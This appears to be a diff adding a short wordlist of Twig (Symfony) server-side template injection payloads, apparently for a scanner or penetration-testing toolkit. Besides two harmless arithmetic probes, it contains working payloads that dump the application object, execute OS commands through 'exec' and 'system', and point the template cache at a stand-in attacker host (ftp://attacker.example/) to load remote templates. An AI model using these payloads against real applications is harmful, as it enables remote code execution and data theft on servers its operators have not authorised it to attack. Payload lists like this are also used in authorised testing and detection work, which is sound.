@@ -1,0 +1,8 @@
+# ssti/twig — Twig (Symfony) SSTI probes
+{{7*7}}
+{{7*'7'}}
+{{dump(app)}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{_self.env.setCache("ftp://attacker.example/")}}
+{{_self.env.enableAutoReload()}}
+{{['id']|filter('system')}}
